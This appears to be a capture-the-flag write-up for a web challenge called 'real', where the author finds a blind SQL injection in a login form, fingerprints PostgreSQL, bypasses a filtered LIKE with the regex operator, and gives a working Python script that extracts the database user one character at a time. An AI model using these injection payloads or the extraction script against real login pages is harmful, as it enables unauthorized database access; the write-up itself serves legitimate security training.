---
title: "Web: real"
date: "2024-08-03"
tags:
    - sqli
thumbnail: "/assets/img/thumbnail/ascwgs24.png"
---


# Description
---
A BBH got a vulnerability in this site but the triager needs POC, The flag will be the db username in UPPERCASE and there's rate limit (1 request per second)

# solution
---
When we start the challange we will see this login page
<img src="/assets/img/ascwgs/login.png">


It's a very very simple page and during my first attempts i noticed that the output can be:
- welcome (status code 200) and this occurs when the login is done successfully
- error (status code 400) and this occurs when the login is failed (wrong creds or wrong syntax)
- filtered and this occurs when using symbols or words which are forbidden

when i tried `username=admin%27--&password=a` i got welcome in response like this
<img src="/assets/img/ascwgs/first.png">

we got the injection point and i see it's a blind sqli.
I was tring to retrieve the data from the tables but there's misunderstanding.
I thought he wants a different user in the same table but it wants the username of the db which is the user connected to database.
and this misunderstanding made me take too much time as i want to get data from users table and the `()` were filtered, so i was in a rabbit hole.

After noticing that we need the db user i starting thinking in a different way.
I want to know the type of data base.
I noticed that the database accepts `--` as comment and refuse `#` and after asking chatgpt i knew that my database now can be `Oracle` or `Postgresql`

After searching about differences i found that there's a table called `all_tables` in oracle corresponds to `information_schema.tables` in postgresql.

I made sure that the db is postgresql using these parameters `username=admin%27union%20select%20null,null%20from%20information_schema.tables--&password=a` and got welcome in the response.

Now i want to get the postgres dbusername.

After searching i found that to get it we use `select current_user`
There may be other ways but this worked with me and was very simple.

Now i want to inject it in the username parameter and this can be done by `admin' and current_user like 'A%'--` this will return welcome if the first character in the current_user is A.

but the problem here is `like` is filtered, so after asking chatgpt i found an alternative which is `admin' and current_user ~ '^A'--` and it has the same functionality.

We should run the same query for all possible characters and for the length of the username.
I created this script to do this job
```py
import requests
import time
import urllib3

urllib3.disable_warnings()
# Base URL and target endpoint
url = "https://real.ascwg-challs.app/login"

# Headers for the request
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://real.ascwg-challs.app",
    "Referer": "https://real.ascwg-challs.app/",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

# Characters to iterate over
characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_0123456789!@#%^&*()-=_+[]{}|;:',.<>?/`~\"\\abcdefghijklmnopqrstuvwxyz"

# Base injection point
base_injection = "admin'AND CURRENT_USER ~ '^"
password = "a"

def bruteforce():
    # Initialize the discovered prefix
    prefix = ""

    # Try to find each character of the username
    while True:
        for char in characters:
            # Replace the placeholder §u§ with the current prefix + char
            current = prefix + char
            injection = base_injection+current+'\'--'
            data = f"username={injection}&password={password}"

            # Send POST request
            response = requests.post(url, headers=headers, data=data, verify=False)

            # Wait for 1 second to respect the rate limit
            time.sleep(1)
            # Check for a successful response
            if response.status_code == 200:
                prefix += char
                print(f"Found: {prefix}")
                break  # Move to the next character


if __name__ == "__main__":
    bruteforce()
```

And ..
<img src="/assets/img/ascwgs/flag3.png">
GG !!